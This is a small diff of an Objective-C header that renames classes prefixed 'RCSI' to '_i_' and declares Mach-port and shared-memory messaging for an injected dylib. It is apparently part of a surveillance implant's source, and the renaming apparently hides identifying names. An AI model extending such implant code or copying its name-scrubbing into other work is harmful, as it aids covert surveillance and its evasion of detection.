@@ -30,7 +30,7 @@ CFDataRef dylibMessagesHandler(CFMessagePortRef local,
                                void *info);
 
 
-@interface RCSISharedMemory : NSObject
+@interface _i_SharedMemory : NSObject
 {
 @private
   NSString            *mFilename;
@@ -58,14 +58,14 @@ CFDataRef dylibMessagesHandler(CFMessagePortRef local,
 @property (readonly) NSMutableArray *mLogMessageQueue;
 
 
-+ (RCSISharedMemory *)sharedInstance;
++ (_i_SharedMemory *)sharedInstance;
 + (BOOL)sendMessageToCoreMachPort:(NSData*)aData withMode:(NSString*)aMode;
 + (BOOL)sendMessageToMachPort:(mach_port_t)port 
                      withData:(NSData *)aData;
  
 - (int)createDylibRLSource;
 - (void)addPort: (CFMessagePortRef)port;
-- (void)putBlob:(RCSIDylibBlob*)aBlob;
+- (void)putBlob:(_i_DylibBlob*)aBlob;
 - (id)getBlob;
 - (id)getBlobs;
 - (void)delBlobs;
